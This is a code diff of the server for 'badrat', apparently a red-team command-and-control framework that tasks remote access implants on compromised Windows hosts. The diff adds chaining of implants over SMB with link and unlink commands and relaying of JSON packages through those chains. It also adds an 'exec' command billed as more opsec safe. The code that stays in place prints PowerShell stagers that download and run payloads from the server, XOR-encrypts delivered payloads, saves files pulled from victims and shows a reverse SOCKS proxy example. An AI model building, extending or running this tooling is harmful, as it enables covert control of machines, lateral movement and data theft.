@@ -59,12 +59,13 @@ usernames = {}
 hostnames = {}
 ip_addrs = {}
 notes = {}
-
+upstream = {}
+links = {}
 
 # Tab completion stuff -- https://stackoverflow.com/questions/5637124/tab-completion-in-pythons-raw-input
 class Completer(object):
     def __init__(self):
-        self.tab_cmds = ['all', 'rats', 'download', 'upload', 'psh', 'csharp', 'spawn', 'quit', 'back', 'exit', 'help', 'remove', 'clear', 'stagers', "shellcode", "eval", "note", "set-msbuild-path"]
+        self.tab_cmds = ['all', 'rats', 'download', 'upload', 'psh', 'csharp', 'spawn', 'quit', 'back', 'exit', 'help', 'remove', 'clear', 'stagers', "shellcode", "eval", "note", "set-msbuild-path", "link", "unlink", "exec"]
         self.re_space = re.compile('.*\s+$', re.M)
 
     def add_tab_item(self, item):
@@ -112,6 +113,18 @@ class Completer(object):
             res[0] += ' '
             return res
 
+    def _complete_unlink(self, link=None):
+        if not link:
+            return list(links[ratID]) + ["all"]
+        res = [l for l in (list(links[ratID]) + ["all"]) if l.startswith(link)]
+        # Partial match
+        if(len(res) > 1):
+            return res
+        # Exact match
+        if(len(res) == 1):
+            res[0] += ' '
+            return res
+
     # Register all these completable commands as having special arguments
     # Completable path argments except 'remove' and 'note' which autocompletes to the ratID
     def complete_upload(self, args):
@@ -134,6 +147,9 @@ class Completer(object):
 
     def complete_note(self, args):
         return self._complete_rat(args[0])
+
+    def complete_unlink(self, args):
+        return self._complete_unlink(args[0])
 
     def complete(self, text, state):
         "Generic readline completion entry point."
@@ -171,7 +187,7 @@ def pretty_print_banner():
     $$ |  $$ | $$$$$$$ |$$ /  $$ |$$ |  \__| $$$$$$$ |  $$ |    \$$$$$$\        (    / _/    /' o O| ,_( ))___     (`
     $$ |  $$ |$$  __$$ |$$ |  $$ |$$ |      $$  __$$ |  $$ |$$\  \____$$\        ` -|   )_  /o_O_'_(  \\'    _ `\    )
     $$$$$$$  |\$$$$$$$ |\$$$$$$$ |$$ |      \$$$$$$$ |  \$$$$  |$$$$$$$  |          `"\"\"\"`            =`---<___/---'
-    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v1.6.15 No more CMD.exe        "`
+    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v2.0.-1 Imagine the Graph      "`
     """
     pretty_print(banner)
 
@@ -218,6 +234,8 @@ def colors(value):
         return(colors[types[value]] + value + ENDC)
     elif(value == "all"):
         return(BOLD + "ALL RATS" + ENDC)
+    elif(value == "<direct>"):
+        return("<direct>")
     elif(value == ">>"):
         return( BOLD + c + ">" + js + ">" + ENDC)
     elif(value == "quit"):
@@ -273,11 +291,11 @@ def send_ratcode(ratID=None, ratType=None, ip_addr=None):
             ratcode = fd.read()
 
             # Added ratcode xor encryption for js and hta payloads only -- see resources/ekript.py
-            if(not no_payload_encryption and ratType == "js"):
+            if(not no_payload_encryption and str.endswith(ratType, "js")):
                 key = ekript.gen_key()
                 ratcode = ekript.make_js_loader_template(ekript.ekript_js(ratcode, key), key)
 
-            if(not no_payload_encryption and ratType == "hta"):
+            if(not no_payload_encryption and str.endswith(ratType, "hta")):
                 key = ekript.gen_key()
                 # In the case of a JS file the JS source is just the entire file...
                 # For HTA's the JS source is everything between the <script> </script> tags
@@ -297,6 +315,44 @@ def send_ratcode(ratID=None, ratType=None, ip_addr=None):
 
     fd.close()
     return(ratcode)
+
+def link_smb(ratID, filepath): # returns eval data for rat and registers link dict
+    if(types[ratID] == "ps1" or types[ratID] == "c#"):
+        pretty_print("[!] Link is not supported for PS1 or C# rats")
+        return
+
+    if("None" in links[ratID]):
+        links[ratID].remove('None')
+    links[ratID].append(filepath)
+
+    with open(os.getcwd() + "/resources/smb_link.js", "r") as fd:
+        smb_link_data = fd.read()
+    with open(os.getcwd() + "/resources/run_extra.js", "r") as fd:
+        run_extra_data = fd.read()
+    
+    smb_link_data = smb_link_data.replace("~~FILEPATH~~", filepath.replace("\\", "\\\\"))
+    smb_link_data = base64.b64encode(smb_link_data.encode('utf-8')).decode('utf-8')
+
+    run_extra_data = run_extra_data.replace("~~EXTRAB64~~", smb_link_data)
+
+    pretty_print("[*] Linking " + colors(ratID) + " to peer rat over SMB file path: " + filepath)
+    return "ev " + base64.b64encode(run_extra_data.encode('utf-8')).decode('utf-8')
+
+def unlink_smb(ratID, filepath):
+    if filepath == "all":
+        links[ratID] = ["None"]
+        return "ev " + encode_file(os.getcwd() + "/resources/smb_unlink_all.js")
+    
+    with open(os.getcwd() + "/resources/smb_unlink.js", "r") as fd:
+        smb_unlink_data = fd.read()
+    smb_unlink_data = smb_unlink_data.replace("~~FILEPATH~~", filepath.replace("\\", "\\\\\\\\")) # replace \ with \\\\ since we also account for meta-programming
+
+    if(filepath in links[ratID]):
+        links[ratID].remove(filepath)
+        if(not links[ratID]):
+            links[ratID] = ["None"]
+    
+    return "ev " + base64.b64encode(smb_unlink_data.encode('utf-8')).decode('utf-8')
 
 def encode_file(filepath):
     with open(Path(filepath).resolve() , "rb") as fd:
@@ -453,7 +509,7 @@ def serve_server(port=8080):
         # Check to see if we are serving ad-hoc ratcode -- GET version
         ip_addr = request.environ['REMOTE_ADDR']
         if(str.startswith(path, rand_path + "/b.") and not disable_staging):
-            ratType = path.split(".")[1]
+            ratType = ".".join(path.split(".")[1:])
             return(send_ratcode(ratType=ratType, ip_addr=ip_addr))
         elif(verbose):
             pretty_print("[v] GET request from non-rat client requested path /" + path)
@@ -468,53 +524,90 @@ def serve_server(port=8080):
             ratType = path.split(".")[1]
             return(send_ratcode(ratType=ratType, ip_addr=ip_addr))
 
+        #
+        # Rats and the server communicate with each other using JSON strings
+        # To support peer-to-peer rats, each rat and the server send 1 or more "packages" to and from each other.
+        # Packages are formatted like so: { "p":[ {package1}, {package2} ] }
+        #
+        # Data sent from a rat (Rat --> Server) may look like the following. This data contains 2 packages
+        # { "p":[ {"type": "hta", "id": 3082961485, "un": "kclark", "hn": "WS01"}, {"type": "js", "id": 123345667, "un": "Administrator", "hn": "DC"} ] }
+        #
+        # Data sent back TO a rat (Server --> Rat) looks similar, but the packages will contain different values. Example below. This data also contains 2 packages.
+        # { "p":[ {"id":"123445677","cmnd": "whoami"}, {"id":"3082961485","cmnd": "hostname"} ] }
+        #
+
         # We are dealing with normal rat comms
-        # Parse POST parameters
+        # Parse POST parameters into JSON string then into python dict
         post_json = request.get_json(force=True)
-        post_dict = dict(post_json)
+        if(verbose):
+            pretty_print("[v] rat sent data: " + str(post_json))
+        
         try:
-            ratID = str(post_dict['id'])
-            ratType = str(post_dict['type'])
-            username = str(post_dict['un'])
-            hostname = str(post_dict['hn'])
-            if(ratType not in supported_types):
-                ratType = "?"
+            post_dict = dict(post_json)
+            packages = post_dict['p']
         except:
-            pretty_print("\n[!] Failed to grab id, type, username, or hostname param from POST request")
+            pretty_print("\n[!] Failed to parse post_dict or pull list of packages out of POST request")
+            return(default_page())
+            
+        return_dict = {"p": []} # We will use this to build the return JSON
+        # For loop starts here ... parse each package one at a time
+        for package in packages:
+            try:
+                ratID = str(package['id'])
+                ratType = str(package['type'])
+                username = str(package['un'])
+                hostname = str(package['hn'])
+                if(ratType not in supported_types):
+                    ratType = "?"
+            except:
+                if(verbose):
+                    pretty_print("\n[!] Failed to grab id, type, username, or hostname param from package " + str(package))
+                continue
+    
+            # Update checkin time for an agent every checkin
+            checkin = datetime.now().strftime("%H:%M:%S")
+            rats[ratID] = checkin
+            types[ratID] = ratType
+            usernames[ratID] = username
+            hostnames[ratID] = hostname
+            ip_addrs[ratID] = ip_addr
+
+            if(ratID == str(packages[-1]['id'])): # if the ratID is the same as the ratID in the last (or only package) then it is a directly connected rat
+                upstream[ratID] = "<direct>"
+            else:
+                upstream[ratID] = packages[-1]['id'] # the last package is the package on "top of the stack" and so the most upstream rat
+    
+            # Register new rat checkin
+            if(ratID not in commands):
+                commands[ratID] = ""
+                links[ratID] = ["None"]
+                comp.add_tab_item(ratID)
+                pretty_print("[*] (" + datetime.now().strftime("%H:%M:%S, %b %d") + ") New rat checked in: " + colors(ratID))
+
+    
+            if("retval" in package.keys()):
+                commands[ratID] = ""
+                pretty_print("[*] Results from rat " + colors(str(package['id'])) + ":\n")
+                pretty_print('\033[1;97m' + base64.b64decode(package['retval']).decode('utf-8') + '\033[0m')
+    
+            if("dl" in package.keys()):
+                commands[ratID] = "" # Reset command back to "" (blank) after we finish processing the results
+                rand = ''.join(random.choice(alpha) for choice in range(10)) 
+                with open(Path("downloads/" + ratID + "." + rand).resolve() , "wb") as fd:
+                    fd.write(base64.b64decode(package['dl']))
+                pretty_print("\n[*] File download from rat " + colors(ratID) + " saved to " + colors("downloads/" + colors(ratID)) + colors("." + rand))
+    
+            # Reset the command on deck to blank after sending the command (so we don't get repeated executions of the same command)
+            cmnd = commands[ratID]
+            commands[ratID] = ""
+            return_dict['p'].append({"id": ratID, "cmnd": cmnd})
+
+        if(not return_dict['p']): # if no packages in return_dict, return default page
             return(default_page())
 
-        # Update checkin time for an agent every checkin
-        checkin = datetime.now().strftime("%H:%M:%S")
-        rats[ratID] = checkin
-        types[ratID] = ratType
-        usernames[ratID] = username
-        hostnames[ratID] = hostname
-        ip_addrs[ratID] = ip_addr
         if(verbose):
-            pretty_print("[v] rat " + colors(ratID) + " sent data: " + str(post_json))
-
-        # If there is no current command for a rat, create a blank one
-        if(ratID not in commands):
-            commands[ratID] = ""
-            comp.add_tab_item(ratID)
-            pretty_print("[*] (" + datetime.now().strftime("%H:%M:%S, %b %d") + ") New rat checked in: " + colors(ratID))
-
-        if("retval" in post_dict.keys()):
-            commands[ratID] = ""
-            pretty_print("[*] Results from rat " + colors(str(post_dict['id'])) + ":\n")
-            pretty_print('\033[1;97m' + base64.b64decode(post_dict['retval']).decode('utf-8') + '\033[0m')
-
-        if("dl" in post_dict.keys()):
-            commands[ratID] = "" # Reset command back to "" (blank) after we finish processing the results
-            rand = ''.join(random.choice(alpha) for choice in range(10)) 
-            with open(Path("downloads/" + ratID + "." + rand).resolve() , "wb") as fd:
-                fd.write(base64.b64decode(post_dict['dl']))
-            pretty_print("\n[*] File download from rat " + colors(ratID) + " saved to " + colors("downloads/" + colors(ratID)) + colors("." + rand))
-
-        # Reset the command on deck to blank after sending the command (so we don't get repeated executions of the same command)
-        cmnd = commands[ratID]
-        commands[ratID] = ""
-        return(htmlify(json.dumps({"cmnd": cmnd})))
+            pretty_print("[v] Server sends data to rat " + colors(ratID) + ": " + json.dumps(return_dict))
+        return(htmlify(json.dumps(return_dict)))
 
     if(verbose):
         pretty_print("[v] Starting badrat in verbose mode. Prepare to have your screen flooded.")
@@ -561,15 +654,19 @@ def get_stagers(lhost):
     pretty_print('  [Scriptblock]::Create([net.webclient]::new().DownloadString("' + url + 'ps1")).invoke()')
     pretty_print('  [Management.Automation.PowerShell]::Create().addscript((irm ' + url + 'ps1)).invoke()')
     pretty_print("")
+    pretty_print("    For SMB rats: curl the file down to/from your local machine")
+    pretty_print("  " + colors("curl " + url + "smb.js  -o b.smb.js") + "  or")
+    pretty_print("  " + colors("curl " + url + "smb.hta -o b.smb.hta") + " Then upload the file to your target")
+    pretty_print("")
 
 def get_rats(current=""):
-    pretty_print("\n    {:<10}\t{:<4}\t{:<8}\t{:<20}\t{:<15}\t{:<10}".format("implant id", "type", "check-in","username","ip address","hostname"))
-    pretty_print("    ----------\t----\t--------\t--------            \t----------     \t--------")
+    pretty_print("\n    {:<10}\t{:<4}\t{:<8}   {:<10}\t{:<20}\t{:<15}\t{:<15}\t{:<6}".format("implant id","type","check-in","upstream","username","ip address","hostname","links"))
+    pretty_print("    ----------\t----\t--------   --------\t--------               \t----------     \t--------\t-----")
     for ratID, checkin in rats.items():
         if(current == ratID or current == "all"):
-            pretty_print(" {:<2} {:<10}\t{:<4}\t{:<8}\t{:<20}\t{:<15}\t{:<10}".format(colors(">>"), ratID, colors(types[ratID]), colors(checkin), usernames[ratID], ip_addrs[ratID], hostnames[ratID]))
+            pretty_print(" {:<2} {:<10}\t{:<4}\t{:<8}   {:<10}\t{:<20}\t{:<15}\t{:<15}\t{:<15}".format(colors(">>"), colors(ratID), colors(types[ratID]), colors(checkin), colors(str(upstream[ratID])), usernames[ratID], ip_addrs[ratID], hostnames[ratID], ", ".join(links[ratID])))
         else:
-            pretty_print("    {:<10}\t{:<4}\t{:<8}\t{:<20}\t{:<15}\t{:<10}".format(ratID, colors(types[ratID]), colors(checkin), usernames[ratID], ip_addrs[ratID], hostnames[ratID]))
+            pretty_print("    {:<10}\t{:<4}\t{:<8}   {:<10}\t{:<20}\t{:<15}\t{:<15}\t{:<6}".format(colors(ratID), colors(types[ratID]), colors(checkin), colors(str(upstream[ratID])), usernames[ratID], ip_addrs[ratID], hostnames[ratID], ", ".join(links[ratID])))
         if(ratID in notes.keys() and notes[ratID] != ""):
             pretty_print("      L..:>> " + notes[ratID])
     pretty_print("")
@@ -597,20 +694,28 @@ def get_help():
     pretty_print("")
     pretty_print("Server commands: -- commands to control the badrat server")
     pretty_print("help -- it's this help page, duh")
-    pretty_print("rats/agents/sessions -- gets the list of rats and their last checkin time")
+    pretty_print("rats -- gets the list of rats and their last checkin time")
     pretty_print("exit -- exits the badrat console and shuts down the listener")
     pretty_print("<ratID> -- start interacting with the specified rat")
     pretty_print("all -- start interacting with ALL rats")
     pretty_print("back -- backgrounds the current rat and goes to the main menu")
-    pretty_print("remove all -- unregisters ALL rats")
     pretty_print("remove <ratID> -- unregisters the specified <ratID>")
+    pretty_print("remove all -- unregisters ALL rats")
     pretty_print("clear -- clear all rat command queues (useful for stopping accidental commands)")
     pretty_print("note -- add a note to a rat")
+    pretty_print("set-msbuild-path -- Sets an alternate path for msbuild. Affects all rats (global scope)")
+    pretty_print("example: set-msbuild-path C:\\windows\\temp\\definitely-not-msbuild.exe")
+    pretty_print("example: set-msbuild-path default")
     pretty_print("")
     pretty_print("Rat commands: -- commands to interact with a badrat rat")
     pretty_print("<command> -- enter shell commands to run on the rat. Uses cmd.exe or powershell.exe depending on rat type")
+    pretty_print("exec -- Used to execute programs without running cmd.exe, but does not return output. More Opsec safe, runs in background, does not block")
+    pretty_print("example: exec wscript C:\\users\\username\\badrat.smb.js")
     pretty_print("quit -- when interacting with a rat, type quit to task the rat to shut down")
-    pretty_print("spawn -- used to spawn a new rat in a new process.")
+    pretty_print("spawn -- used to spawn a new rat in a new process. (doesn't work with SMB rats, don't even try...)")
+    pretty_print("link -- tells the current rat to link to a child rat given a local file or UNC path")
+    pretty_print("example: link \\\\Server01\\Public\\link.txt")
+    pretty_print("unlink -- tells the current rat to disconnect from a child rat given a local file or UNC path")
     pretty_print("psh <local_powershell_script_path> <extra powershell commands> -- Runs the powershell script on the rat. Uses MSBuild.exe or powershell.exe depending on the agent type")
     pretty_print("example: psh script/Invoke-SocksProxy.ps1 Invoke-ReverseSocksProxy -remotePort 4444 -remoteHost 12.23.34.45")
     pretty_print("csharp <local_c_sharp_exe_path> <command_arguments> -- Runs the assembly on the remote host using MSBuild.exe and a C Sharp reflective loader stub")
@@ -631,8 +736,8 @@ def get_help():
     pretty_print("Some rats need to write to disk for execution or cmd output. Every rat that must write to disk cleans up files created.")
     pretty_print("By default, rat communications are NOT SECURE. Do not send sensitive info through the C2 channel unless using SSL")
     pretty_print("Rats are designed to use methods native to their type as much as possible. E.g.: HTA rat will never use Powershell.exe, and the Powershell rat will never use cmd.exe")
-    pretty_print("Tal Liberman's AMSI Bypass is included by default for msbuild psh execution (js and hta ONLY). This may not be desireable and can be turned off by changing the variable at the beginning of this script")
-    pretty_print("All assemblies run with \"csharp\" must be compiled with a public Main method and a public class that contains Main\n")
+    pretty_print("All assemblies run with \"csharp\" must be compiled with a public Main method and a public class that contains Main")
+    pretty_print("The longer the chain of rats, the longer it takes for a send/receive round trip. Formula = (2 * n * d) where n = number of rats in the chain, and d = delay/sleep time.\n")
 
 if __name__ == "__main__":
     # Start the Flask server
@@ -661,7 +766,7 @@ if __name__ == "__main__":
                 sys.exit()
 
             # Gets the help info
-            elif(inp == "help"):
+            elif(str.startswith(inp, "help")):
                 get_help()
 
             # Set the msbuild path
@@ -696,15 +801,18 @@ if __name__ == "__main__":
 
             elif(inp == "clear"):
                 commands = commands.fromkeys(commands, "")
-                pretty_print("Cleared all rat command queues!")
+                pretty_print("[*] Cleared all rat command queues!")
 
             # Enter rat specific command prompt
             elif(inp in rats.keys() or inp == "all"):
                 ratID = inp
+                if(ratID != "all" and upstream[ratID] != "<direct>"):
+                    prompt = colors(str(upstream[ratID])) + " <-- " + colors(ratID) + " \\\\> "
+                else:
+                    prompt = colors(ratID) + " \\\\> "
 
                 # Interact-with-rat loop
                 while True:
-                    prompt = colors(ratID) + " \\\\> "
                     inp = input(prompt)
                     log_console(prompt + inp)
 
@@ -720,10 +828,10 @@ if __name__ == "__main__":
 
                         elif(inp == "clear"):
                             commands = commands.fromkeys(commands, "")
-                            pretty_print("Cleared all rat command queues!")
+                            pretty_print("[*] Cleared all rat command queues!")
                             continue
 
-                        elif(inp == "help"):
+                        elif(str.startswith(inp, "help")):
                             get_help()
                             continue
 
@@ -757,6 +865,9 @@ if __name__ == "__main__":
                         elif(inp == "spawn"):
                             if(types[ratID] == "ps1" or types[ratID] == "hta"):
                                 inp = "spawn " + send_ratcode(ratID)
+
+                        elif(str.startswith(inp, "exec ")):
+                            inp = "ex " + base64.b64encode(" ".join(inp.split(" ")[1:]).encode('utf-8')).decode('utf-8')
 
                         elif(str.startswith(inp, "psh ")):
                             try:
@@ -798,6 +909,17 @@ if __name__ == "__main__":
                             except:
                                 pretty_print("[!] Could not open file " + colors(filepath) + " for reading or other unexpected error occured")
                                 continue
+
+                        elif(str.startswith(inp, "link ")):
+                            filepath = inp.split(" ")[1]
+                            inp = link_smb(ratID, filepath)
+
+                        elif(str.startswith(inp, "unlink ")):
+                            filepath = inp.split(" ")[1]
+                            if(filepath == "None"):
+                                pretty_print("[!] You can't unlink \"None\" (that doesn't even make sense)") # horrible
+                                continue
+                            inp = unlink_smb(ratID, filepath)
 
                         elif(str.startswith(inp, "cs ") or str.startswith(inp, "csharp ")):
                             try:
